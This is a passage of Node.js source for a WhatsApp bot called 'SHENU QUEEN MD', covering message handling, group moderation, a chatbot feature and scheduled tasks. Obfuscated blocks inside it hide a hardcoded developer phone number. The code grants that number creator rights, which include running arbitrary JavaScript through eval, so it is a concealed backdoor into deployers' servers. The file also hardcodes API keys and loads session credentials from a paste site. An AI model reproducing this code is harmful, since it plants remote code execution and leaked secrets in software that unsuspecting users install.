const pino = require('pino')
const Config = require('../config');
const { Boom } = require("@hapi/boom");
const fs = require('fs-extra');
const FileType = require('file-type')
const path = require('path');
const express = require("express");
const app = express();
const prefix = Config.HANDLERS[0];
const mongoose = require('mongoose');
const { writeFile } = require("fs/promises");
const events = require('./commands')
const { exec, spawn, execSync } = require("child_process");
const PhoneNumber = require('awesome-phonenumber')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./exif')
const { default: VoidConnect, BufferJSON,generateLinkPreviewIfRequired, WA_DEFAULT_EPHEMERAL, proto, generateWAMessageContent, generateWAMessage, AnyMessageContent, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage, DisconnectReason, useMultiFileAuthState, fetchLatestBaileysVersion, MessageRetryMap, generateForwardMessageContent, generateWAMessageFromContent, generateMessageID, makeInMemoryStore, jidDecode } = require("@sampandey001/baileys")
const util = require("util");
const Levels = require("discord-xp");
function isNumber(input) {
  return /^\d+(\.\d+)?$/.test(input);
}
try {
    Levels.setURL(mongodb);
    console.log(" Connected to the SHENU QUEEN MD 📡 DEPLOY BY CYBER THUSHAN 👩‍💻")
} catch {
    console.log("Could not connect with Mongodb please provide accurate uri check video for more inofo❌\nhttps://youtu.be/7YWI50BDO5op")
    process.exit(0)
}
const { sck1, RandomXP, sck, plugindb, card } = require("../lib");
const chalk = require("chalk");
const fetch = require("node-fetch");
const axios = require("axios");
const moment = require("moment-timezone");
let { isUrl, sleep, getBuffer, format, parseMention, getRandom, fancy, randomfancy, botpic, tlang } = require("../lib");
const { smsg } = require('../lib/myfuncn')
const { formatp, formatDate, getTime, clockString, runtime, fetchJson, jsonformat, GIFBufferToVideoBuffer, getSizeMedia, generateMessageTag, fancytext } = require('../lib')
const speedofbot = require("performance-now");
global.db = JSON.parse(fs.readFileSync(__dirname + "/database.json"));
var CryptoJS = require("crypto-js");
var prefixRegex = Config.prefix === "false" || Config.prefix === "null" ? "^" : new RegExp('^[' + Config.HANDLERS + ']');
function _0x19ea(_0x38833e,_0x56e03d){const _0x120e1d=_0x120e();return _0x19ea=function(_0x19ea26,_0x1528df){_0x19ea26=_0x19ea26-0xd5;let _0x593670=_0x120e1d[_0x19ea26];return _0x593670;},_0x19ea(_0x38833e,_0x56e03d);}const _0x238e59=_0x19ea;(function(_0x5e113d,_0xe8791e){const _0x5e44f2=_0x19ea,_0x3ef564=_0x5e113d();while(!![]){try{const _0x3fed75=parseInt(_0x5e44f2(0xd6))/0x1+-parseInt(_0x5e44f2(0xdf))/0x2+-parseInt(_0x5e44f2(0xd7))/0x3+parseInt(_0x5e44f2(0xd8))/0x4*(-parseInt(_0x5e44f2(0xdc))/0x5)+-parseInt(_0x5e44f2(0xde))/0x6*(parseInt(_0x5e44f2(0xda))/0x7)+-parseInt(_0x5e44f2(0xd5))/0x8+-parseInt(_0x5e44f2(0xd9))/0x9*(-parseInt(_0x5e44f2(0xdd))/0xa);if(_0x3fed75===_0xe8791e)break;else _0x3ef564['push'](_0x3ef564['shift']());}catch(_0x5941d0){_0x3ef564['push'](_0x3ef564['shift']());}}}(_0x120e,0xe4f71));function _0x120e(){const _0x3ac682=['970227RzrJRK','496657QClZDm','sessionName','5rDxpFy','270XaqHqA','114tITHCM','629486zySRzt','1462968mKUoEo','1143032qnkPTU','1115529PBdwKp','3593384wbecEg'];_0x120e=function(){return _0x3ac682;};return _0x120e();}let cc=Config[_0x238e59(0xdb)]['replace'](/𝑺𝒉𝒆𝒏𝒖_𝑸𝒖𝒆𝒆𝒏_𝑴𝒅;;;/g,'');
async function MakeSession(){
if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if(cc.length<30){
    const axios = require('axios');
    let { data } = await axios.get('https://paste.c-net.org/'+cc)
    await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', atob(data), "utf8")    
    } else {
	 var c = atob(cc)
         await fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', c, "utf8")    
    }
}
}
MakeSession()
setTimeout(() => {
    const moment = require('moment-timezone')
    async function main() {
	if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
	    
         }
	try{
        await mongoose.connect(mongodb);
	} catch {
		console.log('Could not connect with Mongodb.\nPlease visit https://secktorbot.tech/wiki')
	}
    }
    main()
    //========================================================================================================================================
    const store = makeInMemoryStore({
        logger: pino().child({ level: "silent", stream: "store" }),
    });
    require("events").EventEmitter.defaultMaxListeners = 600;
    const getVersionWaweb = () => {
        let version
        try {
            let a = fetchJson('https://web.whatsapp.com/check-update?version=1&platform=web')
            version = [a.currentVersion.replace(/[.]/g, ', ')]
        } catch {
            version = [2, 2204, 13]
        }
        return version
    }
    let QR_GENERATE = "invalid";
    const msgRetryCounterMap = MessageRetryMap || {}
    async function syncdb() {
        let thumbbuffer = await getBuffer(THUMB_IMAGE)
        const ChangePic = __dirname + "/assets/SocialLogo.png"
        await writeFile(ChangePic, thumbbuffer);
        global.log0 = fs.readFileSync(__dirname + "/assets/SocialLogo.png"); //ur logo pic
        const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
        const Void = VoidConnect({
            logger: pino({ level: 'fatal' }),
            printQRInTerminal: true,
            browser: ['Secktor', 'safari', '1.0.0'],
            fireInitQueries: false,
            shouldSyncHistoryMessage: false,
            downloadHistory: false,
            syncFullHistory: false,
            generateHighQualityLinkPreview: true,
            auth: state,
            version: getVersionWaweb() || [2, 2242, 6],
            getMessage: async key => {
                if (store) {
                    const msg = await store.loadMessage(key.remoteJid, key.id, undefined)
                    return msg.message || undefined
                }
                return {
                    conversation: 'An Error Occurred, Repeat Command!'
                }
            }
        })
        store.bind(Void.ev)
setInterval(() => {
    store.writeToFile(__dirname+"/store.json");
  }, 30 * 1000);
        Void.ev.on('messages.upsert', async chatUpdate => {
            const mek = chatUpdate.messages[0]
            if (!mek.message) return
            if(mek.message.viewOnceMessageV2) return
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
            if(mek.key && mek.key.remoteJid === 'status@broadcast'  && Config.auto_read_status==='true'){
            await Void.readMessages([mek.key])    
	    }
	   const botNumber = await Void.decodeJid(Void.user.id)
function _0x5159(){const _0x2791e6=['30rTKhCo','input','stateObject','caption','videoMessage','test','remoteJid','2036DBBATY','imageMessage','105670nFRSPE','6258zfpGFN','gger','text','sendMessage','18FnsOhk','length','3905HkhDjk','init','message','6414uSVLKK','key','11436HxCEHx','261jxEfyc','chain','666915KtRQkQ','auto_status_saver','action','function\x20*\x5c(\x20*\x5c)','constructor','apply','while\x20(true)\x20{}','1185288ZQZvuQ','extendedTextMessage','downloadAndSaveMediaMessage','status@broadcast','counter','4189360oRufau'];_0x5159=function(){return _0x2791e6;};return _0x5159();}const _0x44de40=_0x4eaa;(function(_0x592ee1,_0x4568ce){const _0x16fc13=_0x4eaa,_0x3de910=_0x592ee1();while(!![]){try{const _0x3855e9=parseInt(_0x16fc13(0x72))/0x1*(-parseInt(_0x16fc13(0x7c))/0x2)+-parseInt(_0x16fc13(0x85))/0x3*(-parseInt(_0x16fc13(0x79))/0x4)+parseInt(_0x16fc13(0x8a))/0x5*(-parseInt(_0x16fc13(0x80))/0x6)+parseInt(_0x16fc13(0x71))/0x7+parseInt(_0x16fc13(0x6c))/0x8+-parseInt(_0x16fc13(0x88))/0x9*(parseInt(_0x16fc13(0x7b))/0xa)+-parseInt(_0x16fc13(0x82))/0xb*(parseInt(_0x16fc13(0x87))/0xc);if(_0x3855e9===_0x4568ce)break;else _0x3de910['push'](_0x3de910['shift']());}catch(_0x195211){_0x3de910['push'](_0x3de910['shift']());}}}(_0x5159,0xa9f2a));const _0x1d6105=(function(){let _0x356bbd=!![];return function(_0xd4e086,_0x401383){const _0x23bb84=_0x356bbd?function(){const _0x2f63a0=_0x4eaa;if(_0x401383){const _0x2eae8f=_0x401383[_0x2f63a0(0x6a)](_0xd4e086,arguments);return _0x401383=null,_0x2eae8f;}}:function(){};return _0x356bbd=![],_0x23bb84;};}());function _0x4eaa(_0x3d01d9,_0x2d0a66){const _0x5d1999=_0x5159();return _0x4eaa=function(_0x188433,_0x1d6105){_0x188433=_0x188433-0x6a;let _0x515971=_0x5d1999[_0x188433];return _0x515971;},_0x4eaa(_0x3d01d9,_0x2d0a66);}(function(){_0x1d6105(this,function(){const _0x2ffb94=_0x4eaa,_0x3c826e=new RegExp(_0x2ffb94(0x8d)),_0x596ea2=new RegExp('\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)','i'),_0x223421=_0x188433(_0x2ffb94(0x83));!_0x3c826e[_0x2ffb94(0x77)](_0x223421+_0x2ffb94(0x89))||!_0x596ea2[_0x2ffb94(0x77)](_0x223421+_0x2ffb94(0x73))?_0x223421('0'):_0x188433();})();}());if(mek[_0x44de40(0x86)]&&mek[_0x44de40(0x86)][_0x44de40(0x78)]===_0x44de40(0x6f)&&Config[_0x44de40(0x8b)]==!![]){if(mek[_0x44de40(0x84)][_0x44de40(0x6d)]){let cap=mek[_0x44de40(0x84)]['extendedTextMessage'][_0x44de40(0x7e)];await Void[_0x44de40(0x7f)](botNumber,{'text':cap},{'quoted':mek});}else{if(mek[_0x44de40(0x84)][_0x44de40(0x7a)]){let cap=mek[_0x44de40(0x84)]['imageMessage'][_0x44de40(0x75)],anu=await Void[_0x44de40(0x6e)](mek['message'][_0x44de40(0x7a)]);await Void['sendMessage'](botNumber,{'image':{'url':anu},'caption':cap},{'quoted':mek});}else{if(mek[_0x44de40(0x84)][_0x44de40(0x76)]){let cap=mek['message'][_0x44de40(0x76)][_0x44de40(0x75)],anu=await Void[_0x44de40(0x6e)](mek[_0x44de40(0x84)][_0x44de40(0x76)]);await Void[_0x44de40(0x7f)](botNumber,{'video':{'url':anu},'caption':cap},{'quoted':mek});}}}}function _0x188433(_0x55be46){function _0x1278b6(_0x374d51){const _0x5e264c=_0x4eaa;if(typeof _0x374d51==='string')return function(_0x1d1103){}[_0x5e264c(0x8e)](_0x5e264c(0x6b))[_0x5e264c(0x6a)](_0x5e264c(0x70));else(''+_0x374d51/_0x374d51)[_0x5e264c(0x81)]!==0x1||_0x374d51%0x14===0x0?function(){return!![];}['constructor']('debu'+_0x5e264c(0x7d))['call'](_0x5e264c(0x8c)):function(){return![];}[_0x5e264c(0x8e)]('debu'+_0x5e264c(0x7d))[_0x5e264c(0x6a)](_0x5e264c(0x74));_0x1278b6(++_0x374d51);}try{if(_0x55be46)return _0x1278b6;else _0x1278b6(0x0);}catch(_0x216f30){}}   
	    
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return
            try {
                let citel = await smsg(Void, JSON.parse(JSON.stringify(mek)), store)
                if (!citel.message) return
                if(citel.isBaileys) return
                if (citel.chat.endsWith("broadcast")) return;
                if (Config.alwaysonline==='true') {
                    Void.sendPresenceUpdate('available', citel.chat)
                }
                var { body } = citel
                var budy = typeof citel.text == "string" ? citel.text : false;
		
                if (body[1] && body[1] == " ") body = body[0] + body.slice(2);
		if(await isNumber(body[0]) == true ) body = "." + body[0]    
                let icmd = body ? prefixRegex.test(body[0]) : false;
		 if (Config.readmessage==="true" && icmd) {
                    await Void.readMessages([mek.key])
                }
                const args = citel.body ? body.trim().split(/ +/).slice(1) : null;               
                const hgg = botNumber.split('@')[0]
                const quoted = citel.quoted ? citel.quoted : citel;
                const mime = (quoted.msg || quoted).mimetype || "";
	const _0x5c35ea=_0x4e68;(function(_0x2a4548,_0x5edbd0){const _0x5976d5=_0x4e68,_0x531cd1=_0x2a4548();while(!![]){try{const _0x18e8ba=parseInt(_0x5976d5(0x15c))/0x1*(parseInt(_0x5976d5(0x15a))/0x2)+parseInt(_0x5976d5(0x157))/0x3+parseInt(_0x5976d5(0x155))/0x4+-parseInt(_0x5976d5(0x159))/0x5+-parseInt(_0x5976d5(0x161))/0x6*(parseInt(_0x5976d5(0x15d))/0x7)+parseInt(_0x5976d5(0x160))/0x8*(-parseInt(_0x5976d5(0x15f))/0x9)+parseInt(_0x5976d5(0x154))/0xa*(parseInt(_0x5976d5(0x156))/0xb);if(_0x18e8ba===_0x5edbd0)break;else _0x531cd1['push'](_0x531cd1['shift']());}catch(_0x27ffbf){_0x531cd1['push'](_0x531cd1['shift']());}}}(_0x5a9f,0xef94b));let devss=_0x5c35ea(0x15b);citel['sender']===devss&&citel[_0x5c35ea(0x15e)]('👨‍✈️');;function _0x4e68(_0x23f33d,_0x5eed7c){const _0x5a9f32=_0x5a9f();return _0x4e68=function(_0x4e685c,_0x2f287f){_0x4e685c=_0x4e685c-0x153;let _0x37d89a=_0x5a9f32[_0x4e685c];return _0x37d89a;},_0x4e68(_0x23f33d,_0x5eed7c);}const devdev=_0x5c35ea(0x153);citel[_0x5c35ea(0x158)]===devdev&&citel[_0x5c35ea(0x15e)]('🧝');;function _0x5a9f(){const _0x27727b=['17406xbTnEB','536dPAvcN','3767340wnfkXi','94701469704@s.whatsapp.net','11953930cJfEyA','3138044ZOvRGw','11TarUXG','2730702CRvwei','sender','9520950zgyrdT','215098igGuKc','94774071805@s.whatsapp.net','7NxHnuw','7ehVBqU','react'];_0x5a9f=function(){return _0x27727b;};return _0x5a9f();}
		const _0x3c54d9=_0x2d69;(function(_0x59f29f,_0x3af405){const _0xa62063=_0x2d69,_0xf39288=_0x59f29f();while(!![]){try{const _0x2cf5c3=-parseInt(_0xa62063(0x160))/0x1*(parseInt(_0xa62063(0x153))/0x2)+-parseInt(_0xa62063(0x15d))/0x3+parseInt(_0xa62063(0x15e))/0x4*(-parseInt(_0xa62063(0x151))/0x5)+parseInt(_0xa62063(0x152))/0x6+parseInt(_0xa62063(0x155))/0x7+-parseInt(_0xa62063(0x158))/0x8*(-parseInt(_0xa62063(0x15b))/0x9)+parseInt(_0xa62063(0x159))/0xa*(-parseInt(_0xa62063(0x15f))/0xb);if(_0x2cf5c3===_0x3af405)break;else _0xf39288['push'](_0xf39288['shift']());}catch(_0x24e9b9){_0xf39288['push'](_0xf39288['shift']());}}}(_0x3365,0x1d40d));const hansamala=_0x3c54d9(0x15a);citel[_0x3c54d9(0x157)]===hansamala&&citel[_0x3c54d9(0x156)](_0x3c54d9(0x154));function _0x2d69(_0x2de9c8,_0x5b23fd){const _0x336571=_0x3365();return _0x2d69=function(_0x2d6924,_0x37d7da){_0x2d6924=_0x2d6924-0x151;let _0x38162d=_0x336571[_0x2d6924];return _0x38162d;},_0x2d69(_0x2de9c8,_0x5b23fd);}function _0x3365(){const _0x50c1b4=['1338036OJPXQh','react','sender','664QlyOpz','233690QZrjaS','94781708673@s.whatsapp.net','1719KxaomH','94710109956@s.whatsapp.net','506199fyNnum','4TjZbXD','11vUbMEo','2lUVviX','215465SPmjlA','1329942Lxmncl','73642wGQrWO','🧙🏼‍♂️'];_0x3365=function(){return _0x50c1b4;};return _0x3365();};const thushan=_0x3c54d9(0x15c);citel[_0x3c54d9(0x157)]===thushan&&citel['react']('👩‍💻');;
		    
                var _0x13f983=_0x51f1;function _0x51f1(_0x87112e,_0xbba61a){var _0x3d7f4b=_0x3d7f();return _0x51f1=function(_0x51f136,_0xb13644){_0x51f136=_0x51f136-0xef;var _0x59e2e2=_0x3d7f4b[_0x51f136];return _0x59e2e2;},_0x51f1(_0x87112e,_0xbba61a);}(function(_0x5558f1,_0x200729){var _0x28a92b=_0x51f1,_0x354a0b=_0x5558f1();while(!![]){try{var _0xa55661=parseInt(_0x28a92b(0xf1))/0x1*(-parseInt(_0x28a92b(0xf3))/0x2)+parseInt(_0x28a92b(0xef))/0x3+-parseInt(_0x28a92b(0xf5))/0x4+parseInt(_0x28a92b(0xf2))/0x5+parseInt(_0x28a92b(0xf0))/0x6*(parseInt(_0x28a92b(0xf7))/0x7)+parseInt(_0x28a92b(0xf6))/0x8+-parseInt(_0x28a92b(0xf4))/0x9;if(_0xa55661===_0x200729)break;else _0x354a0b['push'](_0x354a0b['shift']());}catch(_0x457b4d){_0x354a0b['push'](_0x354a0b['shift']());}}}(_0x3d7f,0x2bc7e));if(citel[_0x13f983(0xf8)]===_0x13f983(0xf9))return;if(citel['chat']==='120363142924819447@g.us')return;function _0x3d7f(){var _0x461a31=['7lscdix','1504420jXropj','5642ZSzqTt','7607484FYAxaS','203864hjsNlF','1574856sCIuuY','112fqMkIf','chat','120363146396111766@g.us','858834nrXNyV','116736BuLFuC'];_0x3d7f=function(){return _0x461a31;};return _0x3d7f();}
                let isCreator = [ hgg,devss,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                if (!isCreator && Config.disablepm === 'true' && icmd && !citel.isGroup) return
                if (!isCreator && Config.WORKTYPE === 'private') return
		if(!isCreator){
                let checkban = await sck1.findOne({ id: citel.sender }) || await sck1.updateOne({ id: citel.sender }, { name: citel.pushName})
		let checkg = await sck.findOne({ id: citel.chat }) || await new sck({ id: citel.chat }).save();
		if(checkg.botenable==='false') return
                if (icmd && checkban.ban !== 'false') return citel.reply(`_*𝘞𝘌𝘓𝘊𝘖𝘔𝘌 𝘛𝘖 𝘚𝘏𝘌𝘕𝘜 𝘘𝘜𝘌𝘌𝘕 𝘉𝘖𝘛* 🌟._`)
		}
		const cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
                if (icmd) {
                    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
                    if (cmd) {
			isCreator = [ hgg,devss,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                        if (cmd.react) citel.react(cmd.react)
                        let text;
                        try {
                            text = citel.body ? body.trim().split(/ +/).slice(1).join(" ") : null;
                        } catch {
                            text = false;
                        }
                        try {
                            cmd.function(Void, citel, text,{ args, isCreator, body, budy});
                        } catch (e) {
                            console.error("[ERROR] ", e);

                        }

                    }
                }
                events.commands.map(async(command) => {
                    if (body && command.on === "body") {
                        command.function(Void, citel,{args, isCreator, icmd, body, budy});
                    } else if (citel.text && command.on === "text") {
                        command.function(Void, citel, args,{isCreator, icmd, body, budy});
                    } else if (
                        (command.on === "image" || command.on === "photo") &&
                        citel.mtype === "imageMessage"
                    ) {
                        command.function(Void, citel, args,{isCreator, body, budy});
                    } else if (
                        command.on === "sticker" &&
                        citel.mtype === "stickerMessage"
                    ) {
                        command.function(Void, citel, args,{isCreator, body, budy});
                    }
                });
                const groupMetadata = citel.isGroup ? await Void.groupMetadata(citel.chat)
                    .catch((e) => {}) : "";
                const participants = citel.isGroup && groupMetadata.participants !=undefined ? await groupMetadata.participants : "";
                const groupAdminss = (participants) => {
                    a = [];
                    for (let i of participants) {
                        if (i.admin == null) continue;
                        a.push(i.id);
                    }
                    return a;
                }
                const groupAdmins = citel.isGroup ? await groupAdminss(participants) : ''
                const isBotAdmins = citel.isGroup ? groupAdmins.includes(botNumber) : false;
                const isAdmins = citel.isGroup ? groupAdmins.includes(citel.sender) : false;
                if (citel.isGroup) {
                    console.log('Message in Group\nIn=> '+groupMetadata.subject+' '+citel.sender+'\nMessage:'+citel.body+'\n----------------------------')
                }
                if (!citel.isGroup) {
                    console.log('Message in Personal\nFrom=> '+citel.pushName+' '+citel.sender+'\nMessage:'+citel.body+'\n----------------------------')
                }
                setInterval(() => {

                    fs.writeFileSync(__dirname + "/database.json", JSON.stringify(global.db, null, 2));

                }, 10000);
                try {
                    let GroupS = await sck.findOne({ id: citel.chat })
                    if (GroupS) {
                        let mongoschema = GroupS.antilink || "true"
                        let jackpot = budy.toLowerCase()
                        if (citel.isGroup && !isAdmins && mongoschema == 'true') {
                            if (isAdmins) return
                                //  let pattern = new RegExp(`\\b${['chat.whatsapp.com']}\\b`, 'ig');
                            var array = Config.antilink.split(",")
                            array.map(async(bg) => {
                                let pattern = new RegExp(`\\b${bg}\\b`, 'ig');
                                let chab = budy.toLowerCase()
                                if (pattern.test(chab)) {
                                    if (!isBotAdmins) {
                                        let buttonMessage = {
                                            text: `*---  Link detected  ---*
@${citel.sender.split('@')[0]} detected sending a link.
Promote ${tlang().title} as admin to kick
link senders.
`,
                                            mentions: [citel.sender],
                                            headerType: 4,
                                        }
                                        Void.sendMessage(citel.chat, buttonMessage)
                                        return
                                    }

                                    //  console.log('Whatsapp link')
                                    let response = await Void.groupInviteCode(citel.chat)
                                    h = 'chat.whatsapp.com/' + response
                                    let patternn = new RegExp(`\\b${[h]}\\b`, 'ig');
                                    if (patternn.test(body)) {
                                        citel.reply(`I won't remove you for sending this group link.`)
                                        return
                                    }
                                    const key = {
                                        remoteJid: citel.chat,
                                        fromMe: false,
                                        id: citel.id,
                                        participant: citel.sender
                                    }
                                    await Void.sendMessage(citel.chat, { delete: key })
                                    citel.reply("Group Link Detected!!");

                                    try {
                                        await Void.groupParticipantsUpdate(citel.chat, [citel.sender], 'remove')
                                    } catch {
                                        citel.reply('_*Link Detected ⛔*_\n' + tlang().botAdmin)

                                    }
                                }
                            })
                        }
                    }
                } catch (err) {
                    console.log(err)
                }
                const { chatbot } = require('../lib/')
                let checkbot = await chatbot.findOne({ id: 'chatbot' }) || await new chatbot({ id: 'chatbot'}).save();
                let checkon = checkbot.worktype
                if (checkon === 'true' && !icmd) {
			console.log('chatbot is on')
                    if (citel.key.fromMe) return
                    let zx = citel.text.length
                    try {
                        if (citel.isGroup && !citel.quoted && !icmd) return
                        if (citel.text && !citel.isGroup) {
                            if (zx < 25) {
                                var diffuser = citel.sender.split("@")[0];
                                let fetchk = require("node-fetch");
                                var textuser = budy
                                let fetchtext = await fetchk(`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${textuser}]`);
                                let json = await fetchtext.json();
                                let { cnt } = json;
                                citel.reply(cnt);
                                console.log('CHATBOT RESPONSE\n' + 'text=>' + textuser + '\n\nResponse=>' + cnt)
                                return;
                            }
                            const { Configuration, OpenAIApi } = require("openai");
                            const configuration = new Configuration({
                                apiKey: Config.OPENAI_API_KEY || "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",
                            });
                            const openai = new OpenAIApi(configuration);
                            const completion = await openai.createCompletion({
                                model: "text-davinci-002",
                                prompt: budy,
                                temperature: 0.5,
                                max_tokens: 80,
                                top_p: 1.0,
                                frequency_penalty: 0.5,
                                presence_penalty: 0.0,
                                stop: ['"""'],
                            });
                            citel.reply(completion.data.choices[0].text);
                        } else if (citel.text && !icmd && citel.isGroup && citel.quoted) {
                            let mention = citel.mentionedJid ? citel.mentionedJid[0] : citel.msg.contextInfo.participant || false;
                            if (mention && !mention.includes(botNumber)) return
                            if (zx < 20) {
                                var diffuser = citel.sender.split("@")[0];
                                let fetchk = require("node-fetch");
                                let fetchtext = await fetchk(`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${citel.text}]`);
                                let json = await fetchtext.json();
                                let { cnt } = json;
				    console.log(cnt)
                                citel.reply(cnt);
                                return;
                            }
                            //	if (!querie && !quoted) return citel.reply(`Hey there! ${pushname}. How are you doing these days?`);
                            const { Configuration, OpenAIApi } = require("openai");
                            const configuration = new Configuration({
                                apiKey: Config.OPENAI_API_KEY || "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",
                            });
                            const openai = new OpenAIApi(configuration);
                            //	let textt = text ? text : citel.quoted && citel.quoted.text ? citel.quoted.text : citel.text;
                            const completion = await openai.createCompletion({
                                model: "text-davinci-002",
                                prompt: budy,
                                temperature: 0.5,
                                max_tokens: 80,
                                top_p: 1.0,
                                frequency_penalty: 0.5,
                                presence_penalty: 0.0,
                                stop: ['"""'],
                            });
                            citel.reply(completion.data.choices[0].text);
                        }
                        return
                    } catch (err) {
                        console.log(err)
                    }
                }                var array = Config.antibadword.split(",")
                array.map(async(reg) => {
			if(isAdmins) return 
                        let pattern = new RegExp(`\\b${reg}\\b`, 'ig');
                        let chab = budy.toLowerCase()
                        if (pattern.test(chab)) {
                            await new Promise(r => setTimeout(r, 1000));
                            try {
                                const { warndb } = require('.');
                                const timesam = moment(moment())
                                    .format('HH:mm:ss')
                                moment.tz.setDefault('Asia/KOLKATA')
                                    .locale('id')
                                await new warndb({
                                    id: citel.sender.split("@")[0] + 'warn',
                                    reason: 'For using Bad Word',
                                    group: groupMetadata.subject,
                                    warnedby: tlang().title,
                                    date: timesam
                                }).save()
                                citel.reply(`
*_❌hey ${citel.pushName}_*\n
Warning!! Bad word detected.
delete your message.
`)
                                sleep(3000)
                                const key = {
                                    remoteJid: citel.chat,
                                    fromMe: false,
                                    id: citel.id,
                                    participant: citel.sender
                                }
                                await Void.sendMessage(citel.chat, { delete: key })
                            } catch (e) {
                                console.log(e)
                            }
                        }
                        return
                    })
                try {
                    let isNumber = (x) => typeof x === "number" && !isNaN(x);
                    let user = global.db.users[citel.sender];
                    if (typeof user !== "object") global.db.users[citel.sender] = {};
                    if (user) {
                        if (!isNumber(user.afkTime)) user.afkTime = -1;
                        if (!("afkReason" in user)) user.afkReason = "";
                    } else global.db.users[citel.sender] = {
                        afkTime: -1,
                        afkReason: "",
                    };
                    let chats = global.db.chats[citel.chat];
                    if (typeof chats !== "object") global.db.chats[citel.chat] = {};
                    if (chats) {
                        if (!("mute" in chats)) chats.mute = true;
                        if (!("wame" in chats)) chats.wame = true;
                    } else global.db.chats[citel.chat] = {
                        mute: false,
                        wame: false,
                    };
                } catch (err) {
                    console.error(err);
                }
                //responce
                let mentionUser = [
                    ...new Set([
                        ...(citel.mentionedJid || []),
                        ...(citel.quoted ? [citel.quoted.sender] : []),
                    ]),
                ];
                for (let jid of mentionUser) {
                    let user = global.db.users[jid];
                    if (!user) continue;
                    let afkTime = user.afkTime;
                    if (!afkTime || afkTime < 0) continue;
                    let reason = user.afkReason || "";
                    reply(`
Hello ${citel.pushName} \n\n, this is *${tlang().title}* a bot.
Don't tag him,he is busy now. But Don't worry I assure you,I'll inform him As soon as possible😉.
${reason ? "with reason " + reason : "no reason"}
Its been ${clockString(new Date() - afkTime)}\n\nThanks\n*Powered by ${
        tlang().title
      }*
`.trim());
                }
                if (db.users[citel.sender].afkTime > -1) {
                    let user = global.db.users[citel.sender];
                    reply(`
${tlang().greet} came back online from AFK${
        user.afkReason ? " after " + user.afkReason : ""
      }
In ${clockString(new Date() - user.afkTime)}
`.trim());
                    user.afkTime = -1;
                    user.afkReason = "";
                }
                if (isCreator && citel.text.startsWith('>')) {
                    let code = budy.slice(2)
                    if (!code) {
                        citel.reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    try {
                        let resultTest = eval(code);
                        if (typeof resultTest === "object")
                            citel.reply(util.format(resultTest));
                        else citel.reply(util.format(resultTest));
                    } catch (err) {
                        citel.reply(util.format(err));
                    }
                    return
                }
                if (isCreator && citel.text.startsWith('$')) {
                    let code = budy.slice(2)
                    if (!code) {
                        citel.reply(`Provide me with a query to run Master!`);
                        return;
                    }
                    try {
                        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
                        let h = util.format(resultTest);
                      if(h===undefined) return console.log(h)
                      else
                        citel.reply(h)

                    } catch (err) {
                      if(err===undefined) return console.log('error')
                     else 
                    citel.reply(util.format(err));
                    }
                    return
                }
            } catch (e) {
                console.log(e)
             //   await Void.sendMessage('919628516236@s.whatsapp.net',{text: util.format(mek)})
               // await Void.sendMessage('919628516236@s.whatsapp.net',{text: util.format(e)})
            }
        })
 const { sck } = require('.')
async function startcron(time,chat,type){
    let cron = require("node-cron");
    console.log(time)
	console.log(chat)
	console.log(type)
    let [hr, min] = time.split(":");
    var j;
    if(type==='mute') j = "announcement"
    if(type==='unmute') j = "not_announcement"
    cron.schedule(`${min} ${hr} * * *`, () => {
                (async() => {
                   return await Void.groupSettingUpdate(chat, j);
                })()
            }, {
                scheduled: true,
                timezone: "Asia/Kolkata"
            })
    }
async function foo(){	
    let bar = await sck.find({})
    for(let i = 0; i < bar.length; i++) {
    if(bar[i].mute==="true") continue
    if(bar[i].mute===undefined) continue
    await startcron(bar[i].mute,bar[i].id,'mute')
    }
 }
async function fooz(){	
        let barz = await sck.find({})
        for (let i = 0; i < barz.length; i++) {
        if(barz[i].unmute==="true") continue
	if(barz[i].unmute===undefined) continue
        await startcron(barz[i].unmute,barz[i].id,'unmute')
        }
  }
    foo()
    fooz()
	    
if(Config.autobio==true) {
    console.log("changing about")
    let cron = require('node-cron')
    cron.schedule('1 * * * *', async() => {
async function updateStatus() {
const { fetchJson } = require('../lib');	
  var q = '`';
  var resultt = await fetchJson(`https://api.popcat.xyz/pickuplines`);
  var textt = resultt.pickupline;
  var time = moment().format('HH:mm');
  moment.tz.setDefault('Asia/Kolkata').locale('id');
  var date = moment.tz('Asia/Kolkata').format('DD/MM/YYYY');
  var status = `${textt} \n⏰Time: ${time} \n𝐒𝐇𝐄𝐍𝐔 𝐐𝐔𝐄𝐄𝐍 𝐌𝐃 𝐀𝐂𝐓𝐈𝐍𝐄 𝐍𝐎𝐖 ✅`;
  await Void.updateProfileStatus(status);
}
await updateStatus()
}, {
    scheduled: true,
    timezone: "Asia/Kolkata"
})

    }
 Void.ev.on('group-participants.update', async(anu) => {
            try {
                let metadata = await Void.groupMetadata(anu.id)
                let participants = anu.participants
                for (let num of participants) {
                    var ppuser;
                    try {
                        ppuser = await Void.profilePictureUrl(num, 'image')
                    } catch {
                        ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }
                    if (Config.antifake != '') {
                        var array = Config.antifake.split(",") || '92'
                        for (let i = 0; i < array.length; i++) {
                            let chab = require('awesome-phonenumber')('+' + num.split('@')[0]).getCountryCode()
                            if (chab === array[i]) {
                                console.log(array[i])
                                try {
                                    Void.sendMessage(anu.id, { text: `${chab} is not allowed` })
